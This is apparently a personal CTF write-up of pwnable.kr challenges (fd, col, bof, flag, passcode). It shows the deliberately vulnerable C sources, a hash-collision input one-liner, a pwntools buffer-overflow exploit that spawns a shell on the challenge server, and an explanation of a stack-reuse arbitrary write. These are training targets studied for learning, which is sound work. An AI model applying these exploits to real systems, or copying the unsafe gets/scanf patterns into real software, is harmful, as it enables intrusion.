# pwn.kr

## 01 fd
fd == 	0 -> stdin;
	1 -> stdout;
	2 -> stderror;

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
## 02 col
```sh
./col `python -c "print '\x01' * 16  + '\xE8' + '\x05' + '\xd9' + '\x1D' " `
```
hash collision, just find the hash value and fake an input to reach the value.

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```
## 03 bof
bof vulnerability with out limitation.
A backdoor, overwriting the local `key` valuable is all you need.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

here is the exp:
```py
#!/bin/python3

from pwn import *

# io = process('./bof')
io = remote('pwnable.kr', 9000)
# elf = ELF('./bof')

payload = b''
payload += p32(0xcafebabe) * 20

io.sendlineafter(b'me : ', payload)

io.interactive()
```

## 04 flag

reverse challenge..  a UPX packer related tool can solve this problem easily...
sry.. 

https://www.52pojie.cn/forum.php?mod=viewthread&tid=1148556

thx, my BROTHER lol

## 05 passcode

interesting challenge. 

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

observe the function `login()`, and during the initialization of passcode1/2, `scanf` is used not correctly, app takes the value of `passcode` as an address, and read a `%d` into this address.

then we find that the value of passcode can be controlled by STACK reuse mechanism.

Due to the function `welcode()` and `login()`'s sharing caller, they share the same stack's bottom, that is bp, which means the control of passcode1/2 can be done even before the calling of `login()`. 

In the function 'welcome()', we input a much-longer data stream than 'login()', which means the whole stack frame of 'login()' can be fully controlled by us. 

Setting the passcode1 to 0x1000 in `welcode()`, and inputting '0x2000' during `login()`, then (int)0x2000 will be writed into address 0x1000. that's an arbitrary write!

then, easy to hijack the control flow to the `system()` backdoor provided by this app.

